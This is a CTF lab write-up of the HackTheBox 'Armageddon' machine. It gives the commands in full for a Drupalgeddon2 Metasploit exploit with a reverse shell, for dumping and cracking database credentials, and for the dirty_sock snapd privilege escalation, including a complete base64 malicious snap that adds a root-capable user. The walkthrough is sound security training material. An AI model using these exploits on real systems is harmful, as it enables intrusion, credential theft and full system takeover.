@@ -1,0 +1,125 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
+            <h1 class="post-title entry-title">Armageddon HackTheBox Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/armageddon-hackthebox-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2021-10-12T17:53:31+00:00">October 12, 2021</time><time class="updated" datetime="2025-06-20T17:01:06+00:00">June 20, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">We’ll look at another one of HackTheBox machines today, called “Armageddon.” It is an easy box targeting the commonly found threat of using outdated plugins. In this box, an old and vulnerable version of Drupal is showcased. We’d own the root user by targeting it. Here is the methodology.</span></p>
+<h3><span style="color: #800000;">Penetration Testing Methodology</span></h3>
+<p><span style="color: #000000;"><strong>Recon</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Nmap</span></li>
+<li><span style="color: #000000;">Page source recon</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Vulnerability Analysis and Exploitation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Drupalgeddon2 RCE exploit to gain user shell</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Searching for mysql database credentials in default files</span></li>
+<li><span style="color: #000000;">Dumping user credentials from the database</span></li>
+<li><span style="color: #000000;">Cracking the obtained hash</span></li>
+<li><span style="color: #000000;">Snagging user flag and checking sudoers for entries</span></li>
+<li><span style="color: #000000;">Exploiting snapd vulnerability with a local privilege escalation exploit dirty_sock</span></li>
+<li><span style="color: #000000;">Snagging the root flag</span></li>
+</ul>
+<h3><span style="color: #800000;">Recon</span></h3>
+<p><span style="color: #000000;">Machine’s IP was 10.129.48.89. The first step was to run nmap’s aggressive scan to look for open ports. As you can see a port 80 was found to be open.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -A  10.129.48.89</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiIseJMMBSWNZIY_v8137CAhYplR3SCz5373lhxqSgZbTkFUrH_vTmX4-GRyivcJR2bU88jqe9wOEQS9qoRS9HvnABh17fCRNwHQM6voofL9NmLWOujHPOidqYq-bfyYgLE1cseZYn8kJzVtxM8RECvzA_zg7RwluCgn05YLuW1X9QSAOSccZAzeGC0FQ=s16000"/></strong></span></p>
+<p><span style="color: #000000;">On traversing the website on port 80, it seemed a CMS made website.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgv8JwBueTihT_Hyo8JC_Mpr2kQSu0qbTEhyvQn4U7c2OktgF_yCurPcvfl2L3mC0CNy64ixwxbxRfjCtyPCme3vg2WCHQx8ZV3x_qX1L74LKcYTSxO9Hpw6RtwuhypUGaFfxyODhVe_JjPRo7bh945YrUcTErM2L6q8DU6UEfdNrxNUcd1ae3lHOn7Pg=s16000"/></span></p>
+<p><span style="color: #000000;">Upon looking at the source code (view page source option) we noted that Drupal 7 instance was being run. The information was obtained from a default meta tag. Hence, it is always recommended to go through the hassle of hiding version numbers from configuration files, default scripts and HTML pages.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEi6QPLjw2Y1HxDAE_dBp6cnEIIXK0qCj8NGYD7ROhXlUNhu_F8Q4oyaXdcfHMc3LF1vI991WCTHekFHSYsZl9XZmRXzgzA6Lq4M48s8sCZEUPwbAU5FLRcoJSAMmwMEmLs2cC6Oi6l5iwcuIK_qsr_ytvoEFJjnvQeULXSQmasBG4uBGsXa6ZfskBNQzQ=s16000"/></span></p>
+<p><span style="color: #000000;">An immediate thought of using the Drupalgeddon2 exploit came to our mind. Hit and trial, but why not?</span></p>
+<h3><span style="color: #800000;">Vulnerability Analysis and Exploitation</span></h3>
+<p><span style="color: #000000;">We knew that Drupal 7. X before 7.58 was vulnerable to various CVEs including CVE-2018-7600. Drupalgeddon2 exploit is developed to exploit Drupal’s form API and exploits insufficient input validation. You can refer to the original repo <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/dreadlocked/Drupalgeddon2">here</a></strong></span>.</span></p>
+<p><span style="color: #000000;">Gladly Metasploit had this exploit in the framework, so we just used that and spawned an interactive shell. On checking the current directory we saw the site installation files with necessary permissions to let us view the content.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/unix/webapp/drupal_drupalgeddon2
+set rhosts 10.129.48.89
+set lhost 10.10.14.100
+exploit</pre>
+<p><span style="color: #000000;">A basic <strong>ls </strong>let us view contents.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiJxf3lvmGogW9qRRJJ6YDSfuBDQbRAgi5vNKW4F_GyETDi5YzIOpYSIIdikGY0ReUTFTixj1-TijWL3wLKJcZW1hRWEu4s7_9fcMfNB4pMYpKe09ieIbNQrp9ENvVBAHY2qUOcUZzCrNr1B46U1Pjm06PLv7El4NiJ4uxzi-hvy3kjUoxsdq1SHnRB9g=s16000"/></span></p>
+<p><span style="color: #000000;">Instead of trying out other permutations with the files and services running, we followed the most direct route we could think of. Dumping MySQL DB credentials from default files. Just a quick internet search showed us the default directory.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhUUF4KaPuPQeJWxWueFCRJcucigqmvgKXcrI5zYmfOSP2qeT9LniC39uvate9AcdARSwbKJqIzgw_Kg9lbLQeP6pj_rOcEQ1CklhjAptBMMx7rO9dqTgCPh4LQo3S6bIlSyHgAfadlpuFub3letw3G-7qaYIOPPa04kHlbGulwCPiNs4ShNxXR2XVcGg=s16000"/></span></p>
+<p><span style="color: #000000;">As you can see on the official forums of Drupal, we found the location, which is <strong>/sites/default/settings.php</strong></span></p>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiJ-cfFE6LquSuNH7EuuqGxgaoa0wWaZNLlQk8FAMtFNAnsc6w0_WCcKpgISikydcaFJskdycol8-ir05S4WDlCCSot47XBzzRm6y5INy4NG9RN6WsV94kOsesSq3E8mfUUNh-52HdjHRyUWxPHr0OazkEvP3kjOl6KmrpzQSQDnFzN7qQA1Z8ak6F4Tw=s16000"/></strong></span></p>
+<p><span style="color: #000000;">So, we traversed to the directory and read the <strong>settings.php</strong> file</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd sites
+ls
+cd default
+ls
+cat settings.php</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEit3RCCI0S2Wn61zSi1PNCdwsdP0nsB4qrvELH6pJfVpGOW5Up42Qkf69NBLj27GLxVCk1auMyAhJIQpuNedHzZvyZpOnrm3B7YP01k9CzsJH7nlTeze6SNvZ9zKPP3nMQnalsuiyyx0_7bnx_0a0ouRR4_J2BFcAzCbs44KW05nK3AgON5dUHyGyK_Sw=s16000"/></strong></span></p>
+<p><span style="color: #000000;">Scrolling a little further down we observed the credentials.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEi-fAMFz8hGDZAV6JuYFPDNQkFoNTneJFzidJ0NDmUIG-9ftLaO_GIi0BKtu8WrXpbbw-n0I4M2QffOUICWoTnodEDG1bSdDuE-6RRElbFG11CFYhr7pfUg-9DZuaQAGft02MwCkhEQGN5480HSWQzmJNUwA3EtENCCODxfvqkY4dRlO0SkWCFEZ_OieA=s16000"/></span></p>
+<p><span style="color: #000000;">Thereafter, we spawned a bash shell and logged in to the mysql database using the username and password we just found. Observe that we have used ‘-D’ to select database and ‘-e’ to execute the desired command.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">shell
+/bin/bash -i
+netstat -antp</pre>
+<p><span style="color: #000000;">First, we found the available tables in the current database.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">mysql -u 'drupaluser' -p'CQHEy@9M*m23gBVj' -D drupal -e 'show tables;'</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiSkwd6AS_8tAG2j4k-f7yYfM6JdKygJLW5d0_Gg7FqHzXUvNs-_fWhUqtailSOt3xYzdtOVVIMVkear-jGPNY-B6jmNTxjThU4pjgA2j9sgEf9Y5zKwXw-z1-Kzg9dNyODUKuexv4yC4SvP_6gZHqt6ZoKI871crPtHKr5-j5dMItH3oJm70FvIQ63Ug=s16000"/></strong></span></p>
+<p><span style="color: #000000;">An important database ‘users’ was found.</span></p>
+<p><span style="color: #000000;">Next, We used the <strong><em>describe table</em></strong> command to dump the schema of the table and finally, <strong><em>select </em></strong>command to dump username and password.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">mysql -u 'drupaluser' -p'CQHEy@9M*m23gBVj' -D drupal -e 'describe users;'
+mysql -u 'drupaluser' -p'CQHEy@9M*m23gBVj' -D drupal -e 'select name,pass from users;'</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjmcn26mhQr05d3XJ5tFDAjA6040CZ4p3N_KP8EX3wHgEXB15JmZkAzUuPAUoSRehUb6yIApT1HAARWkJbdJj6y-GOGbLl2xujba5cjAjAdlgOOL-8LaADdVPcTFmCg1FU9rwEhGKdcPXD7_JcI6SO0hIwmzGQ-KBuP8sAE53jUj5GmHPa6bNe1EBlUvw=s16000"/></strong></span></p>
+<p><span style="color: #000000;">After obtaining the username (<strong><em>brucetherealadmin</em></strong>) and a password hash, we copied the hash in a text file and cracked it using JohnTheRipper.</span></p>
+<p><span style="color: #000000;">We used the wordlist rockyou.txt, however, the default password.lst works just as fine.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nano hash (to copy the hash in the file)
+john –wordlist=/usr/share/wordlists/rockyou.txt hash</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEguzzBo6vagUuRLojLvNACf8JxowhdpGOut_9PIzJGXgM1atdYDjj5ojsvNacnnmAqR749JskADK6Sm2zlbXAySqDWajqJo8qwA0Nu7mJOpuKzTEQHOlxdqyoa3_rwEmAUdSqKdp8nzCbnnmBsDsLqKcvb6U9SLY_hfWJQ7Cih_ZfMa_9Uf_XlkkMKvLw=s16000"/></strong></span></p>
+<p><span style="color: #000000;">After obtaining the clear text password, we SSHed into the server and snagged the user.txt flag.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh brucetherealadmin@10.129.48.89
+cat user.txt</pre>
+<h3><span style="color: #800000;">Privilege Escalation</span></h3>
+<p><span style="color: #000000;">Next, we checked sudoers file for usable entries and found snap binary in it.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo -l</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhzxrkVbZBSXv1dwnyeCxjM7GV1X8TfYJlXuG_dyYVs7dtHpQjS9lo8sjQ361nQw3DQ-gZ9NY-OcqNHZDwyGbWwcCei020LLQtpyWthO_xY84vJmDyo35dSEpShDnDBOwbImgCv6tR54YEJ77xC6DGaL2BVCAK4m5SGma0IUYdoFv0zKAsAyUxUibgAew=s16000"/></strong></span></p>
+<p><span style="color: #000000;">Snap is a Debian software packaging and deployment system used to install “snaps.” These snaps are other softwares. So, if we were to write our own script and deploy it using snap, we could escalate privileges. This is precisely what the exploit “dirty_sock” did.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEg1FcseGye-aVCfkhh654CtM32g9pRs6UqDXGs92oycgs0x1rR47kcKkHxyN8wW6BSUCYCTa-CA696cUo0l-8MJblzqUhfNBbuI7llL1-QP_mxMNX-gzVtI3nHce1Y1xsyf_dK_jBU0wPZhgg3I_boSonQYl9DdpYsfcmR-Kw4meHhjkptjy4c_3BmrbA=s16000"/></span></p>
+<p><span style="color: #000000;">This exploit tampers with the snapd API running in Debian to append a socket call that makes it believes that a root user is making requests. For more info, refer <a style="color: #000000;" href="https://0xdf.gitlab.io/2019/02/13/playing-with-dirty-sock.html">here</a>.</span></p>
+<p><span style="color: #000000;">Thus, we use the exploit by typing in the following command to create our own snap.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python -c 'print "aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw" + "A"*4256 + "=="' | base64 -d &gt; raj.snap</pre>
+<p><span style="color: #000000;">And then we installed it using</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo /usr/bin/snap install –devmode raj.snap</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgepMu9oEnLogPRjKSOuNObT_pP3FxKc17T1wMmLBnGAcszzZok4MISUfq1b122O_sq1CiS84MnysGCYs2FMqgxlP0kraLsL3GdkWFf0R9XIKUYPJnF00l32ruIOgZKxS9lHMnTS9VrGiyM3FffUp18JlfDL4sC1msMUldaB1OvXnQs8vmZqCfA4DYNeQ=s16000"/></strong></span></p>
+<p><span style="color: #000000;">As you can see, the user dirty_sock has been added in the system. The exploit created a user “dirty_sock” with password “dirty_sock”</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">tail /etc/passwd</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgufgsMCplbiAdGTG0vIGqu_fGjCn79ljf0sEY_4TrbinEhdyrYiT3D203F-bXFj1Wl6I7da_bEEwdBjsR36mDxetQRG4NZiUc3q2Dn2HO9IG32zabfh8fP3Z4HWSZNGMFhvCPIxUNLbD5xZXA3Y9ySM315CQ7r2K8esasrcvyM3Z446frgQIcLF9fpZg=s16000"/></strong></span></p>
+<p><span style="color: #000000;">Now, we were able to SSH into this newly created account. But we simply changed the account using</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">su dirty_sock</pre>
+<p><span style="color: #000000;">The password was the same as the username. Upon checking the sudoers file, we saw that someone could run any command as root. This was the doing of that exploit.</span></p>
+<p><span style="color: #000000;">So, we simply spawned a root shell using</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo -i</pre>
+<p><span style="color: #000000;">And snagged the root flag.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhb4-zQGosU9_2UJ7zW3aKpey_m43Kr-Cxahaq5XOzQgis_zO44L-5udFFQxefPQKZqpy5jbBEvVgDNrpmn-dMtnbPN117oBQQPhCVL8lul5rSuz1NVdh1N7-VqHjTqEl-R5q4yoiBi-oXFstxMJYd15yBQJNzbQ_dRfspBmHREo9nXdP5Fz6f-dQPfgA=s16000"/></span></p>
+<p><span style="color: #000000;">This is how we pwned Armageddon. Please feel free to tell us in the comments how easy did you find our approach and clarifications on any step if they were hard to follow. </span></p>
+<p>Thank you for giving your precious time to read this walkthrough. I hope you have enjoyed and learned something new today. If you want to read more HTB Write-ups. Follow this <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> Happy Hacking!</p>
+<p><span style="color: #000000;"><strong>Author: Harshit Rajpal </strong>is an InfoSec researcher and left and right brain thinker. Contac</span>t<strong> <a class="broken_link" href="https://in.linkedin.com/in/harshit-rajpal-79bb43103">here</a></strong></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
+<!-- YARPP Thumbnails -->
+<h3>Related posts:</h3>
+<div class="yarpp-thumbnails-horizontal">
+<a class="yarpp-thumbnail" rel="norewrite" href="https://www.hackingarticles.in/knife-hackthebox-walkthrough/" title="Knife HacktheBox Walkthrough">
+<span class="yarpp-thumbnail-default"><img src="https://www.hackingarticles.in/wp-content/plugins/yet-another-related-posts-plugin/images/default.png" alt="Default Thumbnail" data-pin-nopin="true"/></span><span class="yarpp-thumbnail-title">Knife HacktheBox Walkthrough</span></a>
+<a class="yarpp-thumbnail" rel="norewrite" href="https://www.hackingarticles.in/intelligence-hackthebox-walkthrough/" title="Intelligence HacktheBox Walkthrough">
+<span class="yarpp-thumbnail-default"><img src="https://www.hackingarticles.in/wp-content/plugins/yet-another-related-posts-plugin/images/default.png" alt="Default Thumbnail" data-pin-nopin="true"/></span><span class="yarpp-thumbnail-title">Intelligence HacktheBox Walkthrough</span></a>
+</div>
+</div>
+            </div><!-- .entry-content -->
+            <footer class="post-footer entry-footer">
+                                                
+            </footer><!-- .entry-footer -->
+            
+	<nav class="navigation post-navigation" aria-label="Posts">
+		<h2 class="screen-reader-text">Post navigation</h2>
+		<div class="nav-links"><div class="nav-previous"><a href="https://www.hackingarticles.in/windows-privilege-escalation-weak-services-permission/" rel="prev">Windows Privilege Escalation: Weak Services Permission</a></div><div class="nav-next"><a href="https://www.hackingarticles.in/windows-privilege-escalation-insecure-gui-application/" rel="next">Windows Privilege Escalation: Insecure GUI Application</a></div></div>
+	</nav>        </div>
